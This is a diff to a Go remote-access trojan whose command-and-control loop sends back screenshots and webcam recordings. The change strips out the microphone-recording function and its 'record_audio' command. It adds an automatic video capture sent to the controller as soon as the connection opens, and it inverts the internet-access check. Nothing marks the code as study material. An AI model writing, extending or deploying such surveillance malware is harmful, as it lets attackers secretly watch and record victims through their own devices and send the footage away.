@@ -3,7 +3,6 @@ package main
 import (
 	"bufio"
 	b64 "encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"image/png"
 	"net"
@@ -13,7 +12,6 @@ import (
 	"time"
 
 	sr "github.com/fstanis/screenresolution"
-	"github.com/gordonklaus/portaudio"
 	"github.com/kbinani/screenshot"
 	"gocv.io/x/gocv"
 )
@@ -73,7 +71,7 @@ func has_internet_access() bool {
 	// attempt to connect to some live host
 
 	_, err := http.Get("https://google.com")
-	return err == nil
+	return err != nil
 }
 
 func reach_command_and_control() {
@@ -87,6 +85,7 @@ func reach_command_and_control() {
 			reach_command_and_control()
 		} else {
 			// communication with C2
+			send_resp(conn, video_recording(0, 5))
 			engage_via(conn)
 		}
 	} else {
@@ -115,9 +114,6 @@ func engage_via(conn net.Conn) {
 			send_resp(conn, result)
 		} else if cmd == "record_webcam" {
 			result := video_recording(1, 5)
-			send_resp(conn, result)
-		} else if cmd == "record_audio" {
-			result := mic_record(30)
 			send_resp(conn, result)
 		}
 	}
@@ -212,30 +208,5 @@ func video_recording(tgt int, t int) string {
 	capture.Close()
 	result := "vid:" + b64_file(file)
 	os.Remove(file)
-	return result
-}
-
-func mic_record(t int) string {
-	file := "/tmp/audio.wav"
-
-	f, _ := os.Create(file)
-
-	portaudio.Initialize()
-	defer portaudio.Terminate()
-	in := make([]int16, 64)
-	stream, _ := portaudio.OpenDefaultStream(1, 0, 16000, len(in), in)
-	defer stream.Close()
-
-	stream.Start()
-	endTime := time.Now().Add(time.Second * time.Duration(t))
-	for time.Now().Before(endTime) {
-		stream.Read()
-		binary.Write(f, binary.LittleEndian, in)
-	}
-	stream.Stop()
-
-	result := "mic:" + b64_file(file)
-	os.Remove(file)
-
 	return result
 }
